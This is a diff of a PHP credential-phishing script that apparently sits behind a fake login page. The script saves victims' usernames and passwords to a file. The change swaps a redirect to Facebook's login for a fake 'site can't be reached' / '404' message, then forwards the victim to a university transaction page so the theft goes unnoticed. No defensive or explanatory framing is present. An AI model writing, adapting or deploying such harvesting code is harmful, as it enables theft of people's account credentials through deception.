@@ -16,8 +16,15 @@ $txt="USERNAME=$username, PASSWORD=$password\n";
 fwrite($myfile, "\n".$txt);
 fclose($myfile);
 
-// after 
-header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
+// when he enter the details he get error message
+echo " This site can’t be reached";
+echo "<br/>"; 
+echo "<br/>"; 
+echo "<br/>"; 
+echo "<br/>"; 
+echo " <b>404 Server Not F ound </b>";
+//when he click login button and after two sec redirect to the sliit online transaction page
+header("Refresh: 2 ; URL=http://www.sliit.lk/online/");
 
 exit();
 
